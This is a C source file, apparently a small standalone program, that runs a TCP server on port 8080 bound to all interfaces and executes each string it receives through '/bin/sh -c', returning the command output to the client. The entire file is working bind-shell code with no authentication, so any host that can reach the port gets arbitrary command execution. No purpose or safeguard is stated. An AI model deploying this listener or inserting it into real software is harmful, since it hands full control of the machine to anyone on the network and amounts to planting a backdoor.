#include <netinet/in.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <sys/wait.h>
#include <unistd.h>

#define PORT 8080

int main()
{
    int sock = socket(AF_INET, SOCK_STREAM, 0);
    if(sock < 0) {
        perror("socket");
        exit(1);
    }

    struct sockaddr_in addr = { 0 };
    addr.sin_family = AF_INET;
    addr.sin_port = htons(PORT);
    addr.sin_addr.s_addr = INADDR_ANY;

    if(bind(sock, (struct sockaddr*)&addr, sizeof(addr)) < 0) {
        perror("bind");
        exit(1);
    }
    if(listen(sock, 10) < 0) {
        perror("listen");
        exit(1);
    }

    printf("Server listening on port %d...\n", PORT);

    while(1) {
    int client = accept(sock, NULL, NULL);
    if(client < 0) continue;

    while(1) {
        char buffer[512];
        int n = read(client, buffer, sizeof(buffer) - 1);
        if(n <= 0) break;  // client disconnected
        buffer[n] = '\0';

        if(strcmp(buffer, "exit") == 0) {
            close(client);
            break;
        }

        pid_t pid = fork();
        if(pid == 0) {
            dup2(client, STDOUT_FILENO);
            dup2(client, STDERR_FILENO);
            char* args[] = { "/bin/sh", "-c", buffer, NULL };
            execv("/bin/sh", args);
            perror("execv failed");
            exit(1);
        } else {
            wait(NULL);
            write(client, "<END>\n", 6); // end-of-output marker
        }
    }
}


    close(sock);
    return 0;
}
